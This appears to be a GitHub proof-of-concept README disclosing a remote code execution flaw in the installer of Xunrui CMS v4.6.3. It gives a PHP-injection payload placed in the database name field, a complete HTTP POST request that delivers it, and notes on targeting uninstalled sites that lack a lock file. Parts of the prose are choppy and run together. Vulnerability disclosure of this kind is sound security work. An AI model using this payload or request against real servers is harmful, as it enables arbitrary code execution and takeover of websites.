# xunruicms_rce
The RCE is connected through the CMS installation interface
# Xunrui CMS Installation Vulnerability

## Affected Range:
- Xunrui CMS Website Edition/Popular Edition v4.6.3 (2024-12-17)

## Payload:
``` exp;-- ---'];phpinfo();['```

###Vulnerability Reproduction:
Normal installation of .database.php
During installation, the process immediately jumps to step 3.
File After Successful Exploitation:
![image](https://github.com/trymonoly/xunruicms_rce/blob/main/%E5%9B%BE%E7%89%871.png)
![image](https://github.com/trymonoly/xunruicms_rce/blob/main/%E5%9B%BE%E7%89%872.png)
![image](https://github.com/trymonoly/xunruicms_rce/blob/main/%E5%9B%BE%E7%89%873.png)
![image](https://github.com/trymonoly/xunruicms_rce/blob/main/%E5%9B%BE%E7%89%874.png)
The file after exploitation shows how the vulnerability is exploited.

#Code Analysis:
In tracing the code, it is found that the issue occurs when writing to . 

![image](https://github.com/trymonoly/xunruicms_rce/blob/main/%E5%9B%BE%E7%89%875.png)
![image](https://github.com/trymonoly/xunruicms_rce/blob/main/%E5%9B%BE%E7%89%876.png)
![image](https://github.com/trymonoly/xunruicms_rce/blob/main/%E5%9B%BE%E7%89%877.png)
The variable is set to the database name provided by the user, which is controllable.database.php$data['db_name']
However, bypassing the database creation query is required.

###Code Flow:
The code checks for the support of the MySQLi component and attempts to connect to MySQL.
The second checks if the entered database name exists. If not, it executes an unfiltered SQL statement. At this point, entering a new database name can bypass the detection, allowing an SQL query to be executed.elseifCREATE TABLE
Thus, the exploit is:
```exp;-- ---'];phpinfo();['```
###Dynamic Analysis:
If the SQL query is successfully executed, the rest of the process proceeds smoothly.
The function is used to write to , achieving Remote Code Execution (RCE).file_put_contentsdatabase.php
###Proof of Concept (PoC):
```
POST /index.php?c=install&m=index&is_install_db=0&step=2 HTTP/1.1
Host: 192.168.1.7:8888
Content-Length: 383
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.7:8888
Referer: http://192.168.1.7:8888/index.php?c=install&m=index&step=2&is_install_db=0
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: csrf_cookie_name=9e9016fb5bc3f485a8e925a7c5c91234; xunruicms_155ac35e9d97cb497b707ff408369036=b2iai3i1vb00fvfljjq4b075p18ul8eg; 155ac35e9d97cb497b707ff408369036_member_uid=1; 155ac35e9d97cb497b707ff408369036_member_cookie=54d727a59f315607beabd35eef7fae6f; XDEBUG_SESSION=XDEBUG_ECLIPSE
Connection: close

is_form=1&is_admin=0&is_tips=&csrf_test_name=9e9016fb5bc3f485a8e925a7c5c91234&data%5Bname%5D=%E6%88%91%E7%9A%84%E9%A1%B9%E7%9B%AE&data%5Bemail%5D=admin%40admin.com&data%5Busername%5D=admin&data%5Bpassword%5D=admin&data%5Bdb_host%5D=127.0.0.1&data%5Bdb_user%5D=root&data%5Bdb_pass%5D=123456&data%5Bdb_name%5D=ee5%3B--+---'%5D%3Bphpinfo()%3B%5B'&data%5Bdb_prefix%5D=dr_&is_install_db=1
```

###Reproduce the Issue:
1.Remotely connect to the attacker's database.
2.The other party did not install the CMS, and did not generate the lock file.
